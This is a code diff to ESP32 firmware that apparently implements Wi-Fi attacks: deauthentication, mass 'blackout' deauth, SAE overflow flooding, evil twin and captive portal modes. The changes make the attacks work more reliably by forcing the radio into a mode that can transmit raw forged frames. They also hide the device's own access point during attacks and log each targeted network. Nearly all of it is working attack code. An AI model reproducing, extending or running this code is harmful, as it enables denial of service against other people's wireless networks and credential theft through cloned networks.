@@ -338,6 +338,13 @@ static void deauth_attack_task(void *pvParameters) {
             memcpy(&deauth_frame[10], targets[i].bssid, 6); // Source (AP)
             memcpy(&deauth_frame[16], targets[i].bssid, 6); // BSSID
             
+            // Log deauth packet info: SSID, BSSID, Channel
+            ESP_LOGI(TAG, "[DEAUTH] SSID: %-32s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %2d",
+                     targets[i].ssid[0] ? targets[i].ssid : "(hidden)",
+                     targets[i].bssid[0], targets[i].bssid[1], targets[i].bssid[2],
+                     targets[i].bssid[3], targets[i].bssid[4], targets[i].bssid[5],
+                     targets[i].channel);
+            
             // Send multiple deauth frames (quiet - no spam)
             for (int j = 0; j < 5; j++) {
                 esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
@@ -374,6 +381,33 @@ esp_err_t wifi_attacks_start_deauth(void) {
     }
     
     ESP_LOGI(TAG, "Starting deauth attack...");
+    
+    // Ensure WiFi is in APSTA mode so we can transmit raw frames on WIFI_IF_AP
+    wifi_mode_t mode;
+    esp_wifi_get_mode(&mode);
+    if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
+        ESP_LOGI(TAG, "Switching WiFi to APSTA mode for raw frame transmission");
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    
+    // If NOT in Evil Twin/Portal mode, hide the AP SSID to prevent broadcasting unwanted network
+    // In Evil Twin mode (portal_active=true), AP config is already set with the cloned SSID
+    if (!portal_active) {
+        wifi_config_t ap_config = {
+            .ap = {
+                .ssid = "",
+                .ssid_len = 0,
+                .ssid_hidden = 1,  // Hide SSID - prevents beacon broadcast
+                .channel = 1,
+                .password = "",
+                .max_connection = 0,  // No connections allowed
+                .authmode = WIFI_AUTH_OPEN
+            }
+        };
+        esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+        ESP_LOGI(TAG, "AP SSID hidden (standalone deauth mode)");
+    }
     
     stats_deauth_sent = 0;
     deauth_attack_active = true;
@@ -548,6 +582,15 @@ esp_err_t wifi_attacks_start_evil_twin(const char *ssid, const char *password) {
         esp_wifi_set_mode(WIFI_MODE_APSTA);
         esp_wifi_start();
         vTaskDelay(pdMS_TO_TICKS(500));
+    } else {
+        // AP netif exists - ensure we're in APSTA mode for raw frame transmission
+        wifi_mode_t mode;
+        esp_wifi_get_mode(&mode);
+        if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
+            ESP_LOGI(TAG, "Switching WiFi to APSTA mode for Evil Twin");
+            esp_wifi_set_mode(WIFI_MODE_APSTA);
+            vTaskDelay(pdMS_TO_TICKS(100));
+        }
     }
     
     // Stop DHCP server to configure custom IP
@@ -808,6 +851,13 @@ static void blackout_attack_task(void *pvParameters) {
                 memcpy(&deauth_frame[10], targets[i].bssid, 6); // Source: AP BSSID
                 memcpy(&deauth_frame[16], targets[i].bssid, 6); // BSSID
                 
+                // Log deauth packet info: SSID, BSSID, Channel
+                ESP_LOGI(TAG, "[BLACKOUT] SSID: %-32s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %2d",
+                         targets[i].ssid[0] ? targets[i].ssid : "(hidden)",
+                         targets[i].bssid[0], targets[i].bssid[1], targets[i].bssid[2],
+                         targets[i].bssid[3], targets[i].bssid[4], targets[i].bssid[5],
+                         targets[i].channel);
+                
                 esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
                 stats_deauth_sent++;
             }
@@ -848,6 +898,30 @@ esp_err_t wifi_attacks_start_blackout(void) {
     }
     
     ESP_LOGI(TAG, "Starting blackout attack...");
+    
+    // Ensure WiFi is in APSTA mode so we can transmit raw frames on WIFI_IF_AP
+    wifi_mode_t mode;
+    esp_wifi_get_mode(&mode);
+    if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
+        ESP_LOGI(TAG, "Switching WiFi to APSTA mode for raw frame transmission");
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    
+    // Hide the AP SSID to prevent broadcasting unwanted network during blackout
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid = "",
+            .ssid_len = 0,
+            .ssid_hidden = 1,  // Hide SSID - prevents beacon broadcast
+            .channel = 1,
+            .password = "",
+            .max_connection = 0,  // No connections allowed
+            .authmode = WIFI_AUTH_OPEN
+        }
+    };
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    ESP_LOGI(TAG, "AP SSID hidden (blackout mode)");
     
     stats_deauth_sent = 0;
     blackout_attack_active = true;
@@ -968,19 +1042,16 @@ static void sae_attack_task(void *pvParameters) {
                 sae_frame[offset++] = esp_random() & 0xFF;
             }
             
+            // Log SAE frame info: SSID, BSSID, Channel
+            ESP_LOGI(TAG, "[SAE] SSID: %-32s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %2d | #%lu",
+                     targets[i].ssid[0] ? targets[i].ssid : "(hidden)",
+                     targets[i].bssid[0], targets[i].bssid[1], targets[i].bssid[2],
+                     targets[i].bssid[3], targets[i].bssid[4], targets[i].bssid[5],
+                     targets[i].channel, (unsigned long)frame_count + 1);
+            
             // Send frame
             esp_wifi_80211_tx(WIFI_IF_AP, sae_frame, offset, false);
             frame_count++;
-            
-            // Log every 50th frame to show progress on both UART and screen
-            if (frame_count % 50 == 0) {
-                ESP_LOGI(TAG, "[SAE Overflow] %lu frames sent | Target: %s (%02X:%02X:%02X:%02X:%02X:%02X) | Channel: %d",
-                         (unsigned long)frame_count,
-                         targets[i].ssid,
-                         targets[i].bssid[0], targets[i].bssid[1], targets[i].bssid[2],
-                         targets[i].bssid[3], targets[i].bssid[4], targets[i].bssid[5],
-                         targets[i].channel);
-            }
             
             vTaskDelay(pdMS_TO_TICKS(5));
         }
@@ -1007,6 +1078,30 @@ esp_err_t wifi_attacks_start_sae_overflow(void) {
     }
     
     ESP_LOGI(TAG, "Starting SAE overflow attack...");
+    
+    // Ensure WiFi is in APSTA mode so we can transmit raw frames on WIFI_IF_AP
+    wifi_mode_t mode;
+    esp_wifi_get_mode(&mode);
+    if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
+        ESP_LOGI(TAG, "Switching WiFi to APSTA mode for raw frame transmission");
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    
+    // Hide the AP SSID to prevent broadcasting unwanted network during SAE attack
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid = "",
+            .ssid_len = 0,
+            .ssid_hidden = 1,  // Hide SSID - prevents beacon broadcast
+            .channel = 1,
+            .password = "",
+            .max_connection = 0,  // No connections allowed
+            .authmode = WIFI_AUTH_OPEN
+        }
+    };
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    ESP_LOGI(TAG, "AP SSID hidden (SAE attack mode)");
     
     sae_attack_active = true;
     xTaskCreate(sae_attack_task, "sae_attack", 8192, NULL, 3, &sae_attack_task_handle);
@@ -1753,6 +1848,15 @@ esp_err_t wifi_attacks_start_portal(const char *ssid) {
         esp_wifi_set_mode(WIFI_MODE_APSTA);
         esp_wifi_start();
         vTaskDelay(pdMS_TO_TICKS(500));
+    } else {
+        // AP netif exists - ensure we're in APSTA mode
+        wifi_mode_t mode;
+        esp_wifi_get_mode(&mode);
+        if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
+            ESP_LOGI(TAG, "Switching WiFi to APSTA mode for Portal");
+            esp_wifi_set_mode(WIFI_MODE_APSTA);
+            vTaskDelay(pdMS_TO_TICKS(100));
+        }
     }
     
     // Stop DHCP server to configure custom IP
